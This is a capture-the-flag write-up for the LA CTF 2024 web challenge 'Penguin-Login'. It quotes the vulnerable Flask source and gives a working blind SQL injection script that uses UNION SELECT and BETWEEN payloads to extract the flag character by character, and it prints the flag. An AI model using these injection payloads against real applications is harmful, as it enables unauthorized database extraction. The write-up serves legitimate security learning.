---
title: Penguin-Login
date: 2024-02-18T20:05:34+02:00
description: Writeup for Penguin-Login [La ctf 2024]
author: H0N3YP0T
tags:
- web
draft: false
---
___

## Challenge Description

I got tired of people leaking my password from the db so I moved it out of the db. penguin.chall.lac.tf

## Intuition

The website is really basic, it only does one request which is vulnerable to SQL injections.

![login](/images/lactf_2024/penguin.png)

![test_sqli](/images/lactf_2024/penguin_test.png)

## Solution

By looking in the source code, I notice that the original query is `"SELECT * FROM penguins WHERE name = '%s'"` but the
tricky part is that a whitelist of characters is used to filter the input. I can not use the word `LIKE` and I can use only
`a-zA-Z0-9` and `{_}` characters.

```python
with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()


@app.post("/submit")
def submit_form():
    conn = None
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400
```

The server does not send the query back, it only sends a message if the query was successful or not. Therefore I need to build an 
error based SQLi. I can use the `BETWEEN` query in order to simulate the `LIKE` query. The following payload is used to guess one by one character of the flag.

![payload](/images/lactf_2024/payload_penguins.png)

This payload is an example where I already know the beginning of the flag (flag{tes) and I want to find out the next character. I use the `BETWEEN` query to check if the character I will inject in the first position of the flag is correct or not. If the server returns `We found a penguin!!!!!` then the character is good otherwise it is not. 
Note that I had `z` at the end of the second part of the `BETWEEN` to check from `a` to `z` and if it is a number then I will add `9` to check from `0` to `9`.
In order to be faster I can use `fuff` to fuzz every character by using a wordlist.

![payload](/images/lactf_2024/fuff_penguins.png)

or even do it by using a script (thanks to [MettleSphee](https://github.com/MettleSphee))

```python
import requests
url = "https://penguin.chall.lac.tf/submit"

headers = {
  'Content-Type': 'application/x-www-form-urlencoded'
}
found=0
alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm}'
found_string="lactf{90stgr353sn0tl7k3th30th3rdbs0w"
#print(brute[len(brute)-1])
while found_string[len(found_string)-1] != "}":
	if (found == 1):
		break
	for brute in alphabet:
		payload = 'username=\'%20UNION%20SELECT%20name%20from%20penguins%20WHERE%20NAME%20BETWEEN%20\''+found_string+brute+'\'%20AND%20\''+found_string+brute+'z'
		response = requests.request("POST", url, headers=headers, data=payload)
		match response.status_code:
			case 201:
				#print("not found yet")
				if (brute=="}"):
					found = 1
					break
			case 200:
				found_string = found_string + brute
				print(found_string)
				if (brute=="}"):
					found = 1
					break
print("Found! "+found_string)
```

![script](/images/lactf_2024/script_penguins.png)

For some reason the flag in the exploit does not contain any `_` character but the flag we have to
submit contains it between the different words which is absolutely demonic. I had a 
lot of trouble to understand the meaning of the flag and put the `_` at the right
place 😡, like, seriously am I the only one who got troubles to understand this `90stgr353sn0tl7k3th30th3rdbs0w0` ???

### Flag

`lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`

